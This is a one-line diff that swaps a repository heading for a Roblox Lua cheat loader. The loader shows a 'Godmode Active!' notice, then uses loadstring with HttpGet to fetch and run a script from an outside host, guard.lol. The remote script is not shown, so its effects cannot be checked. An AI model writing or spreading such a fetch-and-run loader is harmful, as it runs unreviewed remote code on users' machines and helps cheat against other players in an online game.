@@ -1,1 +1,1 @@
-# Iion
+wait(0.1) game.StarterGui:SetCore("SendNotification", { Title = "Godmode Active!"; Text = "Press F9 to Toggle"; Icon = "rbxassetid://60710206892"; Duration = 3; }) loadstring(game:HttpGet("https://guard.lol/scripts/universalscript.lua",true))() 
